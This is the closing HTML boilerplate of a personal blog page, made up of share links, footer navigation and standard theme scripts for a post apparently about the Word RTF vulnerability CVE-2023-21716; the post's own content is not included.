  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&is_video=false&description=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption&body=Check out this article: https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&title=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&title=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&title=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&title=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&name=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&t=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    Bealee
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
      --><li><a href="/">Home</a></li><!--
    --><!--
      --><li><a href="/archives/">Writing</a></li><!--
    --><!--
      --><li><a href="/note/">Note</a></li><!--
    --><!--
      --><li><a href="/tag/">Tag</a></li><!--
    --><!--
      --><li><a href="/search/">Search</a></li><!--
    --><!--
      --><li><a href="/about/">About</a></li><!--
    --><!--
      --><li><a href="/project/">Projects</a></li><!--
    -->
      </ul>
      <ul>
        
      </ul>
    </nav>
  </div>
  
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'cactus-1';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
